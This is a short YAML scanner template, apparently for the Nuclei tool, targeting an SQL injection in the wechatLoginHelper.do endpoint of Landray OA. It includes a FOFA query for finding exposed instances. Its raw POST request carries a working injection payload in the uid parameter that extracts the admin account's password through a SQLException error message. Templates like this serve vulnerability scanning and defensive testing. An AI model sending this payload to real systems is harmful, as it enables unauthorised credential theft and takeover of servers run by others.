id: LanlingOA-wechatloginhelper-sql
 
info:
  name: 蓝凌OA  wechatLoginHelper.do接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞获取服务器敏感信息或权限。导致服务器失陷
  author: cnaq
  severity: high
  metadata: 
    fofa-query: app="Landray-OA系统"
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /third/wechat/wechatLoginHelper.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip, deflate, br
        Connection: close
 
        method=edit&uid=1'and+(SELECT+'password-is:'%2BfdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
 
 
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"password-is","SQLException")